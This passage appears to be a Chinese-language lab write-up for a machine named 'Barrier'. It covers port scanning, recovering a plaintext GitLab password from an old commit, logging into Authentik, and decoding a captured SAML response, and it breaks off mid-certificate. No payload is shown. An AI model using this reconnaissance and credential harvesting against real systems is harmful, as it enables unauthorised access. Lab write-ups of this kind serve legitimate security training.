## Barrier
```
[★]$ nmap -p- -vvv --min-rate 10000 10.129.234.46
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 62
443/tcp  open  https          syn-ack ttl 62
8080/tcp open  http-proxy     syn-ack ttl 63
9000/tcp open  cslistener     syn-ack ttl 62
9443/tcp open  tungsten-https syn-ack ttl 62
```

<details>
<summary>Nmap</summary>

```
[★]$ nmap -p 22,80,443,8080,9000,9443 -sCV 10.129.234.46
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-27 01:57 CDT
Nmap scan report for 10.129.234.46
Host is up (0.0091s latency).

PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  3072 f3:6c:aa:fe:2c:20:f6:55:a0:5b:61:54:cf:39:17:d0 (RSA)
80/tcp   open  http                nginx
|_http-title: Did not follow redirect to https://gitlab.barrier.vl:443/
443/tcp  open  ssl/http            nginx
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=gitlab.barrier.vl/organizationName=Mycompany/stateOrProvinceName=Some-State/countryName=AU
| Subject Alternative Name: DNS:gitlab.barrier.vl
| Not valid before: 2026-01-28T11:21:55
|_Not valid after:  2126-01-04T11:21:55
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was https://10.129.234.46/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 58 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile 
|_/-/user_settings/profile /-/ide/ /-/experiment
8080/tcp open  http                Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
9000/tcp open  cslistener?
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:34 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: d172472750544afd88d5a610fdb69de7
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-Powered-By: authentik
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:34 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: 8a82fc32bf484167a1a24779ddacf494
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|_    X-Powered-By: authentik
9443/tcp open  ssl/tungsten-https?
| ssl-cert: Subject: commonName=authentik default certificate/organizationName=authentik
| Subject Alternative Name: DNS:*
| Not valid before: 2026-03-27T06:47:56
|_Not valid after:  2027-03-27T06:47:56
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:36 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: 651632576ad64bf5919474ba481c756f
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-Powered-By: authentik
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 27 Mar 2026 06:57:37 GMT
|     Location: /flows/-/default/authentication/?next=/
|     Referrer-Policy: same-origin
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Authentik-Id: 43875d4e797644708cd824977962cf81
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|_    X-Powered-By: authentik
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9000-TCP:V=7.94SVN%I=7%D=3/27%Time=69C62A5E%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-L
SF:ength:\x200\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x2
SF:0Fri,\x2027\x20Mar\x202026\x2006:57:34\x20GMT\r\nLocation:\x20/flows/-/
SF:default/authentication/\?next=/\r\nReferrer-Policy:\x20same-origin\r\nV
SF:ary:\x20Accept-Encoding\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x20d17247
SF:2750544afd88d5a610fdb69de7\r\nX-Content-Type-Options:\x20nosniff\r\nX-F
SF:rame-Options:\x20DENY\r\nX-Powered-By:\x20authentik\r\n\r\n")%r(HTTPOpt
SF:ions,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x200\r\nContent-
SF:Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x2027\x20Mar\x202
SF:026\x2006:57:34\x20GMT\r\nLocation:\x20/flows/-/default/authentication/
SF:\?next=/\r\nReferrer-Policy:\x20same-origin\r\nVary:\x20Accept-Encoding
SF:\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x208a82fc32bf484167a1a24779ddacf
SF:494\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nX-Powered-By:\x20authentik\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9443-TCP:V=7.94SVN%T=SSL%I=7%D=3/27%Time=69C62A61%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x20
SF:0\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x202
SF:7\x20Mar\x202026\x2006:57:36\x20GMT\r\nLocation:\x20/flows/-/default/au
SF:thentication/\?next=/\r\nReferrer-Policy:\x20same-origin\r\nVary:\x20Ac
SF:cept-Encoding\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x20651632576ad64bf5
SF:919474ba481c756f\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Optio
SF:ns:\x20DENY\r\nX-Powered-By:\x20authentik\r\n\r\n")%r(GenericLines,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(H
SF:TTPOptions,16F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x200\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Fri,\x2027\x20Ma
SF:r\x202026\x2006:57:37\x20GMT\r\nLocation:\x20/flows/-/default/authentic
SF:ation/\?next=/\r\nReferrer-Policy:\x20same-origin\r\nVary:\x20Accept-En
SF:coding\r\nVary:\x20Cookie\r\nX-Authentik-Id:\x2043875d4e797644708cd8249
SF:77962cf81\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20
SF:DENY\r\nX-Powered-By:\x20authentik\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(S
SF:SLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

#### 加入域名
```
[★]$ echo '10.129.234.46 barrier.vl gitlab.barrier.vl' | sudo tee -a /etc/hosts
10.129.234.46 barrier.vl gitlab.barrier.vl
```
OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
#### 关键词搜索：'openssh 3ubuntu0.13 jammy' , 'Ubuntu package openssh 8.9'
#### 根据OpenSSH 版本判断，主机很可能运行的是 Ubuntu 22.04 jammy LTS（或者可能是 22.10 kinetic）
#### 端口 22 和 8080 的 TTL 值显示为 63，这是距离仅一跳的 Linux 系统的预期 TTL 值：
```
[★]$ sudo lft 10.129.234.46:22
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.465 ms  8.258 ms
 2  barrier.vl (10.129.234.46)  8.604 ms  8.638 ms
[★]$ sudo lft 10.129.234.46:8080
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.392 ms  8.412 ms
 2  barrier.vl (10.129.234.46)  9.141 ms  8.816 ms
```
#### 其他四个端口还需要一次跃点才能到达：
```
[★]$ sudo lft 10.129.234.46:80
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.459 ms  8.349 ms
 2  barrier.vl (10.129.234.46)  8.776 ms  9.688 ms
 3  barrier.vl (10.129.234.46)  8.877 ms  8.806 ms
[★]$ sudo lft 10.129.234.46:443
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.467 ms  8.471 ms
 2  barrier.vl (10.129.234.46)  8.750 ms  8.955 ms
 3  barrier.vl (10.129.234.46)  9.092 ms  8.701 ms
[★]$ sudo lft 10.129.234.46:9000
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.511 ms  8.385 ms
 2  barrier.vl (10.129.234.46)  8.808 ms  8.865 ms
 3  barrier.vl (10.129.234.46)  9.019 ms  8.872 ms
[★]$ sudo lft 10.129.234.46:9443
traceroute to 10.129.234.46 (10.129.234.46), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  8.250 ms  8.254 ms
 2  barrier.vl (10.129.234.46)  8.730 ms  8.911 ms
 3  barrier.vl (10.129.234.46)  8.881 ms  9.138 ms
```
#### 这表明它们正在一个或多个容器中运行
#### 通过访问浏览器 端口 9000 和 9443 都显示引用Authentik 的标头
#### 80端口左下角'Explore',可以看到一个公共仓库,有一个gitconnect.py
<details>
<summary>gitconnect.py</summary>

```
import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_gitlab_repos():
    base_url = 'https://gitlab.barrier.vl'
    api_url = urljoin(base_url, '/api/v4/')
    
    auth_data = {
        'grant_type': 'password',
        'username': 'satoru',
        'password': '***'
    }
    
    try:
        session = requests.Session()
        session.verify = False
        
        response = session.post(urljoin(base_url, '/oauth/token'), data=auth_data)
        response.raise_for_status()
        
        token = response.json()['access_token']
        headers = {'Authorization': f'Bearer {token}'}
        
        projects_response = session.get(urljoin(api_url, 'projects'), headers=headers)
        projects_response.raise_for_status()
        
        projects = projects_response.json()
        
        print("Available repositories:")
        for project in projects:
            print(f"\nName: {project['name']}")
            print(f"Description: {project.get('description', 'No description available')}")
            print(f"URL: {project['web_url']}")
            print(f"Last activity: {project['last_activity_at']}")
            print("-" * 50)
            
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {str(e)}")
        if hasattr(e.response, 'text'):
            print(f"Response text: {e.response.text}")
    finally:
        session.close()

if __name__ == "__main__":
    get_gitlab_repos()
```
</details>

#### 看之前提交中该文件的更改，可以找到密码
```
    auth_data = {
          'grant_type': 'password',
          'username': 'satoru',
          'password': 'dGJ2V72SUEMsM3Ca'
    }
```
#### 这些凭证可以正常登录。目前还没有新的仓库，但我可以创建仓库。我没有看到任何可用的运行器
```
[★]$ curl -k -I https://barrier.vl
HTTP/2 302 
server: nginx
date: Fri, 27 Mar 2026 07:39:15 GMT
content-type: text/html; charset=utf-8
content-length: 0
location: https://barrier.vl/users/sign_in
cache-control: no-cache
content-security-policy: 
permissions-policy: interest-cohort=()
x-content-type-options: nosniff
x-download-options: noopen
x-frame-options: SAMEORIGIN
x-gitlab-meta: {"correlation_id":"01KMQ3QAQAMJBAFEZZ1ZFHH85E","version":"1"}
x-permitted-cross-domain-policies: none
x-request-id: 01KMQ3QAQAMJBAFEZZ1ZFHH85E
x-runtime: 0.032424
x-ua-compatible: IE=edge
x-xss-protection: 1; mode=block
strict-transport-security: max-age=63072000
referrer-policy: strict-origin-when-cross-origin
```
#### 在网站上点击'Help'查看源代码，搜索'version' 看到17.3.2
![图片](images/2026032701.png)
### Tomcat - TCP 8080
https://tomcat.apache.org/
#### 端口 8080 上的站点是Apache Tomcat 的默认页面：
![图片](images/2026032702.png)
#### /manager这里通常是管理员页面所在的地方，但是它会弹出身份验证提示，而 Satoru 凭据不起作用
```
[★]$ curl -I http://10.129.234.46:8080
HTTP/1.1 200 
Accept-Ranges: bytes
ETag: W/"1895-1734881225489"
Last-Modified: Sun, 22 Dec 2024 15:27:05 GMT
Content-Type: text/html
Content-Length: 1895
Date: Fri, 27 Mar 2026 07:54:04 GMT
```
#### 404 页面是Tomcat 的默认 404页面
![图片](images/2026032703.png)
#### 目录暴力破解
<details>
<summary>[★]$ feroxbuster -u http://barrier.vl:8080</summary>

```
[★]$ feroxbuster -u http://barrier.vl:8080
                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://barrier.vl:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       69w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET       63l      291w     2499c http://barrier.vl:8080/manager/html
401      GET       54l      241w     2044c http://barrier.vl:8080/host-manager/html
302      GET        0l        0w        0c http://barrier.vl:8080/manager => http://barrier.vl:8080/manager/
404      GET        1l       62w      691c http://barrier.vl:8080/WEB-INF
302      GET        0l        0w        0c http://barrier.vl:8080/host-manager/ => http://barrier.vl:8080/host-manager/html
302      GET        0l        0w        0c http://barrier.vl:8080/manager/ => http://barrier.vl:8080/manager/html
200      GET       29l      211w     1895c http://barrier.vl:8080/
404      GET        1l       62w      691c http://barrier.vl:8080/META-INF
404      GET       44l      184w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://barrier.vl:8080/manager/images => http://barrier.vl:8080/manager/images/
302      GET        0l        0w        0c http://barrier.vl:8080/manager/css => http://barrier.vl:8080/manager/css/
```
</details>

#### 没什么其他特别有趣的事
### Authentik - TCP 9000 / 9443
#### Authentik是一款开源的身份提供商 (IdP) 和单点登录 (SSO) 解决方案，SSO = Single Sign-On（单点登录）
#### 它支持 SAML、OAuth2、OpenID Connect 和 LDAP 等协议，使组织能够集中管理跨多个应用程序的身份验证，并作为 GitLab、Grafana、Nextcloud 等服务的统一登录门户。它采用自托管模式，通常通过 Docker 进行部署。
#### 使用 Satoru 凭据登录成功，显示两个应用程序 'satoru','dGJ2V72SUEMsM3Ca'
#### 点击第一个应用“Gitlab”，Fn12的Network:显示302的那一个（在第一个），查看请求，发现它使用SAML对 GitLab 进行身份验证：
<details>
<summary>GET https://gitlab.barrier.vl/users/auth/saml/callback?SAMLResponse</summary>

```
GET
	https://gitlab.barrier.vl/users/auth/saml/callback?SAMLResponse=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
```
</details>

https://gchq.github.io/CyberChef/#recipe=URL_Decode(false)From_Base64('A-Za-z0-9%2B/%3D',false,false)Raw_Inflate(0,0,'Adaptive',false,false)
<details>
<summary>CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!</summary>

```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T08:07:08Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="_4e17a6baa23c4376ae3d4585f05c5057"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_867848ec01c34e94b53ff04ce9143f97" IssueInstant="2026-03-30T08:07:08Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="#_867848ec01c34e94b53ff04ce9143f97">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>DRJcu4mThdP3Eb3YyDYIkzkCBB0ql3OrF6MQm9xIMGM=</ds:DigestValue>
</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>oGWFF9ybNNqFibHkGpa/fadOv1Bc5XqFIACcvsi59L4OdlF6ewKR7I/d8UXXPXVL
7LMAhPwX452bSCZ7WbD0sQmXiJ+/mNPOApFVYNWsUjJlaqlwzNuGQJLJpkymgWoc
DWhILIi9VMbeN2v4sXvDMc4xXOAGAcdbT9076BMylFMdDx6zkaNynurDW7PG8DNz
OtxQu7pTbiBAMqZV6DnQHJlojZ88zy7bhzsfzhO2WG8R40Ku1Eq6AZ+Nl4V9I3YV
bf0RXM04sElQM5Rs0fP3F1Kz0d7RHh822l+t7AW1gaLwgLsfvcx33vGb725mqFzN
Z4bonyu2/aAQcDO5Hz2C5XZDVpk0/T0DUAzEkMeZMatM1zokyNX+pK2BhtPS+aQ3
ESYH0LkAopAxIsSF+8anHqh1Rt9er6zu7Gk68bJu/a0AE2u/AxEU+tMkasFjinYI
fK9yKdkVkDHRfd1FCtEugYk51SpcX5uRg0kyMH/0oXKofs9cY9GkC5RB2kaxA5Mp
7UNdzeBBV8bTUUedFjQ0C1qr/PI/4I8cj0Ldfw7qPh/Ew06MrWYwkhpCdsYnRRnz
XQBkatMfvCcMvNYOlKI+kkc5097l7UjAhT9HV/+wf/NUB7cfwlwzzNbm3mcwe52W
E+StCQe71X3ELAygAaUeJEHx6G+HQfx/UFbbMP4YvJk=</ds:SignatureValue>
<ds:KeyInfo>
<ds:X509Data>
<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
